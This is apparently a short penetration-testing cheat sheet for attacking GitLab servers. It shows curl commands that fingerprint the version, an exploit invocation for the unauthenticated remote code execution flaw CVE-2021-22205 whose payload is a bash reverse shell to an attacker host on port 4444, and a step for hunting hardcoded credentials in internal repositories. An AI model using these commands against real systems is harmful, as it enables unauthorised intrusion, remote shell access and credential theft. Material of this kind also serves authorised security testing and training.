# GitLab

### Check GitLab version

Accessible via API or login page — Version determines exploit availability

```bash
curl -s http://$IP/api/v4/version
curl -s http://$IP/help | grep -i "GitLab"
```

---

### GitLab RCE (CVE-2021-22205)

Unauthenticated RCE via image upload — GitLab 11.9-13.10.2

```bash
python3 gitlab_rce.py -u http://$IP -c "bash -i >& /dev/tcp/$LHOST/4444 0>&1"
```

---

### Register account and explore

Public registration may be enabled — Access internal repos

```bash
# http://$IP/users/sign_up
# After login, check: /explore/projects
# Look for hardcoded credentials in repos
```

---
